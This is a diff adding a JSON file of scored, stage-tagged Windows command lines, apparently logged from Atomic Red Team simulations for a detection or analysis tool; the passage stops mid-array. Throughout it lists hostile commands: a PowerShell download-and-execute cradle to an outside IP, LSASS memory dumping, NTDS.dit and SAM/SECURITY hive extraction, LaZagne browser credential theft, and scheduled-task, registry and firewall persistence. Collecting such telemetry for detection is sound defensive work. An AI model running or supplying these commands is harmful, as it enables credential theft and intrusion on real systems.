@@ -1,0 +1,1944 @@
+{
+    "commands": [
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "764fca56fee5525bd098ae311e073bfb",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/yajshw1q/yajshw1q.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "4555f43390fe3494a3d527567cdac02b",
+            "score": "594.2",
+            "type": "command"
+        },
+        {
+            "label": "",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "484f2e9e85b7e62dddd465a31198b585",
+            "score": "594.2",
+            "type": "command"
+        },
+        {
+            "label": "",
+            "stage": "Establish Foothold",
+            "raw_cmd": "",
+            "id": "8695f682358e3f7347e30808cd98aea7",
+            "score": "445.4",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  netsh advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "11199f2a180f949f352ddd69be73b2ff",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  rmdir /s /q C:/%HOMEPATH%/Desktop/T1022",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "133521c54e64440cbfb3778eff26e0be",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+            "stage": "Establish Foothold",
+            "id": "14ae5c7b5d2a49b933d0546b6706c4f3",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  schtasks /delete /tn test /f",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "1710c751ea05824c79c8e363a266dbb0",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C spolsv.exe",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "1bd753c51f02f342b1b9a1945ba4b663",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "2a4aa502707fc6d5da763494941d41b1",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  del /f HookSSLX64.dll",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "2f92f8f70e08b280865f3ee39acaaa4c",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C ./47\u951f\u7686\u8bb9\u62f7\u951f\u65a4\u62f7\u951f\u65a4\u62f7\u951f\u7ede\u7877\u62f7B.ps1",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "34440609e8131676a064d5623c200f8d",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "3f11106677a3a7783e77278e987ceab0",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  lazagne1.exe browsers",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "42ad6840731c1259bed1ea9b7a685e32",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  netstat -an",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "495ae09fb43db72c73a111615fc01a8e",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  wmic computersystem get domain",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "6acf2c7114d0f5859732134d5cd5f182",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "6ea1872984a507282fc609fa9b9a76ca",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "6f4214d38f991b8722648c02d50b675b",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+            "stage": "Establish Foothold",
+            "id": "7e341a3eb12fb991f2bd57f8a717eca2",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  schtasks /delete /tn test /f",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "7ede18ffe0067bc42e26056ca4c34ca6",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "88bbdf49a1ba403f839c469fb1ccba4c",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  del /f /s lsass_dump.dmp",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "88f104fd7dcad85db4c5c375bf3e30b8",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  schtasks /delete /tn test /f",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "a8be2c1c6cd2b2f3bb65c043693f10de",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+            "stage": "Establish Foothold",
+            "id": "b58c294d5cce88ecc3c9084ebb7982af",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "b868af32b977dfa5011d88627c0af145",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "be40b7b24c3f1cfd6679a4b01d056551",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "c3be5dbda1a026a47ca74ea1aa959ed7",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "dafb9acf62a3c17b609c217b9f6ebafd",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  procdump.exe -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "dbf9c8f04fbcd3ab25545dd5df167f66",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  netsh advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "e5cd8e40a87cb0b03fda9a027a7337f2",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "f999a0390aa6fa88400060562d6893f8",
+            "score": "674.8",
+            "type": "command"
+        },
+        {
+            "label": "netsh  advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+            "stage": "null",
+            "raw_cmd": "netsh",
+            "id": "24ebedb2c2f077bb2eeae7a6e6f6f5ca",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "reg  add / HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/Explorer/Run/  /v test /t REG_SZ /d / C:/windows/system32/calc.exe/  /f",
+            "stage": "Internal Reconnaissance",
+            "raw_cmd": "reg",
+            "id": "747b302d0a5747497a39d11e41efbf82",
+            "score": "8.0",
+            "type": "command"
+        },
+        {
+            "label": "spolsv.exe",
+            "stage": "Establish Foothold",
+            "raw_cmd": "spolsv",
+            "id": "1e2f7d4afdedff6e4e0be8378bf059a2",
+            "score": "7.2",
+            "type": "command"
+        },
+        {
+            "label": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+            "stage": "null",
+            "raw_cmd": "schtasks",
+            "id": "ee89d7c76d0b239c6790833dabb32534",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "\" C:/WINDOWS/system32/whoami.exe \"",
+            "stage": "Internal Reconnaissance",
+            "id": "30d138bc1a86ec2f75cf69c770a5f2b4",
+            "score": "17.0",
+            "type": "command"
+        },
+        {
+            "label": "",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "5408eff07b0a3aad30b46c484e5235b2",
+            "score": "568.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/HOSTNAME.EXE",
+            "stage": "Establish Foothold",
+            "raw_cmd": "HOSTNAME",
+            "id": "890e6feef99c0f65dc2ebbfb309d8320",
+            "score": "10.0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/rj51a2aa.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "b9d4e7f18ee3bf58c00b886bce06c1e7",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "lazagne1.exe  browsers",
+            "stage": "Establish Foothold",
+            "raw_cmd": "lazagne1",
+            "id": "bd564e0db1992d4bc0fc7139a4b7d6a9",
+            "score": "131.20000000000002",
+            "type": "command"
+        },
+        {
+            "label": "netstat  -an",
+            "stage": "null",
+            "raw_cmd": "NETSTAT",
+            "id": "c2c7e73fd2cd1797ba62fa01ef623e84",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "wmic  computersystem get domain",
+            "stage": "Establish Foothold",
+            "raw_cmd": "WMIC",
+            "id": "fb7c3d30d2ede90d1b60f559145211b8",
+            "score": "48.4",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/kv5u34xf.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "0abc3227fdf5033b0487dbe27132203d",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/net.exe  group  domain admins  /domain",
+            "stage": "Maintain Persistence",
+            "raw_cmd": "net",
+            "id": "3637266d9466dfb354c8772ff0f98641",
+            "score": "12.0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/rkdbei0g.cmdline",
+            "stage": "Maintain Persistence",
+            "raw_cmd": "csc",
+            "id": "6c4361384f1f6b011437ceba342ec0d2",
+            "score": "12.0",
+            "type": "command"
+        },
+        {
+            "label": "7z.exe  a -tzip T1022.zip C://Users/Administrator/Desktop/T1022",
+            "stage": "Establish Foothold",
+            "raw_cmd": "7z",
+            "id": "15094515321e9a167576fb6c4f3c433f",
+            "score": "36.2",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/nruqy5cg.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "08d25a86c839fc0abb3d9d3a488f9383",
+            "score": "40.599999999999994",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  wmic /node: localhost  shadowcopy call create Volume=C:/",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "2e92e8d07be2773dc1ba41cbf65916c6",
+            "score": "40.0",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  copy //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/NTDS/NTDS.dit C:/Windows/Temp/ntds.dit &amp; copy //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SYSTEM C:/Windows/Temp/VSC_SYSTEM_HIVE &amp; reg save HKLM/SYSTEM C:/Windows/Temp/SYSTEM_HIVE",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "47ea676812bf207d3e3140c251b3ad50",
+            "score": "27.0",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  mkdir C:/Windows/Temp/ntds_T1003 &amp; ntdsutil  ac i ntds   ifm   create full C:/Windows/Temp/ntds_T1003  q q",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "56d95db60864840b99515d883d2fad41",
+            "score": "14.0",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  wmic shadowcopy call create Volume=C:/",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "59bda6cf1918b6b99ace321373b64dd1",
+            "score": "40.0",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  vssadmin.exe create shadow /for=C:",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "7212353bbcf65925b2443858aeb64e9f",
+            "score": "20.0",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  vssadmin.exe create shadow /for=C: &amp; mklink /D C:/Temp/vssstore //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "7584717085dba32fe5cb9137cdb5edeb",
+            "score": "20.0",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "838dfffb7a13305b19bea3a8a072cafd",
+            "score": "554.9999999999999",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/HOSTNAME.EXE",
+            "stage": "null",
+            "raw_cmd": "HOSTNAME",
+            "id": "85828e6e0a615491372fdfbe9bf265d6",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  wmic /node: localhost  process call create  cmd.exe /c esentutl.exe /y /vss c:/windows/ntds/ntds.dit /d c:/ntds.dit",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "d4ee1c99352260eaf83270ab10841e2c",
+            "score": "41.0",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/whoami.exe",
+            "stage": "null",
+            "raw_cmd": "whoami",
+            "id": "fea3792f4fb188a54e6ce570b39d1a7e",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "cscript.exe   /e:VBScript.Encode T1059.007.vbs",
+            "stage": "Maintain Persistence",
+            "raw_cmd": "cscript",
+            "id": "6aa4b847eacd92f5e2c681a0d3c54a03",
+            "score": "12.4",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/HOSTNAME.EXE",
+            "stage": "null",
+            "raw_cmd": "HOSTNAME",
+            "id": "1fe1a5f83688bf8be6eac6970ed08023",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "35539842b904d5cea2881cce0f9381a0",
+            "score": "601.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/whoami.exe",
+            "stage": "null",
+            "raw_cmd": "whoami",
+            "id": "3a38ea5bc9ab701eb594e6309c858583",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  sc query type=service &gt; %TEMP%/T1119_1.txt &amp; doskey /history &gt; %TEMP%/T1119_2.txt &amp; wmic process list &gt; %TEMP%/T1119_3.txt &amp; tree C:/AtomicRedTeam/atomics &gt; %TEMP%/T1119_4.txt",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "461a96301fbef83bf800a37502ec3a31",
+            "score": "47.0",
+            "type": "command"
+        },
+        {
+            "label": "cmd.exe  /c  mkdir %temp%/T1119_command_prompt_collection &gt;nul 2&gt;&amp;1 &amp; dir c: /b /s .docx | findstr /e .docx &amp; for /R c: %f in (*.docx) do copy %f %temp%/T1119_command_prompt_collection",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "56fe4a0466a3a3b63ab49e9247d2d655",
+            "score": "32.0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/ngon5zfo.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "61e7e2b9aebf24de1b03546d553ac07b",
+            "score": "40.400000000000006",
+            "type": "command"
+        },
+        {
+            "label": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "af78bca578b8af6cbb0c48f6982bb3c4",
+            "score": "561.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/cmd.exe /c   C:/Users/Administrator/Desktop/shell/T1059.003_script.bat",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
+            "id": "65b6784bf0b757d8dda52d2b7c38db9e",
+            "score": "36.2",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/fhwdixby/fhwdixby.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "8de52a0399d5f21a4554f7c8fd4be229",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+            "stage": "Establish Foothold",
+            "raw_cmd": "schtasks",
+            "id": "6d7355758464615200f7aa4b8743e16d",
+            "score": "10.0",
+            "type": "command"
+        },
+        {
+            "label": "",
+            "stage": "Establish Foothold",
+            "raw_cmd": "powershell",
+            "id": "219d2dd9d2ee376588c24c26a711a6af",
+            "score": "575.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/HOSTNAME.EXE",
+            "stage": "null",
+            "raw_cmd": "HOSTNAME",
+            "id": "938ad7340a0adb1a721fe365612f77d1",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/b1oyrudp.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "a5679c643be3c5219e9fcd09266480dd",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/whoami.exe",
+            "stage": "null",
+            "raw_cmd": "whoami",
+            "id": "afd44319bf7657fc4b7609625710e089",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "procdump.exe  -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+            "stage": "Escalate Privilege",
+            "raw_cmd": "procdump",
+            "id": "e1af9edecf8a93ce10c5183a287ed85e",
+            "score": "33.6",
+            "type": "command"
+        },
+        {
+            "label": "netsh  advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+            "stage": "Maintain Persistence",
+            "raw_cmd": "netsh",
+            "id": "c8fec1ae0c091f3b6c091617ccc35f9b",
+            "score": "5.0",
+            "type": "command"
+        },
+        {
+            "label": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+            "stage": "null",
+            "raw_cmd": "schtasks",
+            "id": "f62f117f72acc2bd9fc55fbf2551d586",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES9DFD.tmp   c:/Users/Administrator/AppData/Local/Temp/yajshw1q/CSCC27C022EA157424789D83980FB41D195.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "9863e87ac72c1925adc4f266bf99c824",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "Establish Foothold",
+            "raw_cmd": "conhost",
+            "id": "a5a3a54771069c119f39870e132cb356",
+            "score": "10.0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESC646.tmp   c:/Users/Administrator/AppData/Local/Temp/fhwdixby/CSC6CAA6AA7A0DE43F3812D4EDDDF7BD98.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "3c3ef21fee15d93d2d83ac6d288b04f8",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/lbfowsgp.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "5932abe52fabb99ec8b4fb8ee3e92aa4",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "8c7bb7f484f2f265f83287490cf2ddb5",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESA911.tmp   c:/Users/Administrator/AppData/Local/Temp/lbfowsgp/CSC5C7822791F754E7486A439DAA52914D.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "aeaddb88ea0df0a2fc129891fa59706b",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESA568.tmp   c:/Users/Administrator/AppData/Local/Temp/rj51a2aa/CSC69987A1E891048F297459D71D0A9C759.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "084aa9b4eee6ba098e9c41f9c0f70864",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "864589f3b7c5299f9ef01a27b4979b8f",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/oztnp4xi.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "99eedf0076ac1a6f94aebdbb81ea45f9",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF9F0.tmp   c:/Users/Administrator/AppData/Local/Temp/oztnp4xi/CSC2E1569416EFF4A7B814A818C1E193C.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "c0d8d8234b4036793960fd97cfcee27e",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF666.tmp   c:/Users/Administrator/AppData/Local/Temp/b1oyrudp/CSC66C299FECC14DEFBFB5E77107D6CAE.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "8ac931e5618a6200e6557ae769b21c1d",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES971B.tmp   c:/Users/Administrator/AppData/Local/Temp/kv5u34xf/CSC843437488743C18614B83C6BFAB629.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "fe97fdb55cc2e2ca244e97c5a0c2445a",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "lazagne1.exe  browsers",
+            "stage": "Establish Foothold",
+            "raw_cmd": "lazagne1",
+            "id": "4b1d560f1821ad43a18427b64366b8fa",
+            "score": "246.99999999999991",
+            "type": "command"
+        },
+        {
+            "label": "\"cmd.exe /c  reg.exe save hklm/security c:/users/admini~1/appdata/local/temp/tjbvkjpetfjp \"",
+            "stage": "Internal Reconnaissance",
+            "id": "342ae1eab1c260316fe2d61acae7c124",
+            "score": "11.0",
+            "type": "command"
+        },
+        {
+            "label": "\"cmd.exe /c  reg.exe save hklm/sam c:/users/admini~1/appdata/local/temp/tthwwf \"",
+            "stage": "Internal Reconnaissance",
+            "id": "fbcad28e9f3572c21ff47286680ec8a4",
+            "score": "11.0",
+            "type": "command"
+        },
+        {
+            "label": "\"cmd.exe /c  reg.exe save hklm/system c:/users/admini~1/appdata/local/temp/qsdirkg \"",
+            "stage": "Internal Reconnaissance",
+            "id": "ff4efeb67238ca4304c82b5e12482f28",
+            "score": "11.0",
+            "type": "command"
+        },
+        {
+            "label": "reg.exe  save hklm/security c:/users/admini~1/appdata/local/temp/tjbvkjpetfjp",
+            "stage": "Establish Foothold",
+            "raw_cmd": "reg",
+            "id": "21eda83975d0099e3a67781c635afb56",
+            "score": "8.2",
+            "type": "command"
+        },
+        {
+            "label": "reg.exe  save hklm/sam c:/users/admini~1/appdata/local/temp/tthwwf",
+            "stage": "Establish Foothold",
+            "raw_cmd": "reg",
+            "id": "e1a1cb04ed4d69f7ad8bc98fbafbf696",
+            "score": "8.2",
+            "type": "command"
+        },
+        {
+            "label": "reg.exe  save hklm/system c:/users/admini~1/appdata/local/temp/qsdirkg",
+            "stage": "Establish Foothold",
+            "raw_cmd": "reg",
+            "id": "50714ac93f42c80e4c19f1bc65d411b3",
+            "score": "8.2",
+            "type": "command"
+        },
+        {
+            "label": "procdump.exe  -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+            "stage": "Escalate Privilege",
+            "raw_cmd": "procdump64",
+            "id": "5c1f1ec6667430a87316f608d94b08fb",
+            "score": "16.2",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES1013.tmp   c:/Users/Administrator/AppData/Local/Temp/nruqy5cg/CSC1FF97C2055D449BBBEB87BE2E99DAF3.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "c8b1e89c62ea01bd4a3e154bd8affc83",
+            "score": "16.2",
+            "type": "command"
+        },
+        {
+            "label": "wmic  /node: localhost  shadowcopy call create Volume=C:/",
+            "stage": "Establish Foothold",
+            "raw_cmd": "WMIC",
+            "id": "ce2a88230e5215b520bd7f749e810671",
+            "score": "20.4",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "d5768a9b5eafa1c0619b7810ff7a15a3",
+            "score": "0",
+            "type": "command"
+        },
+        {
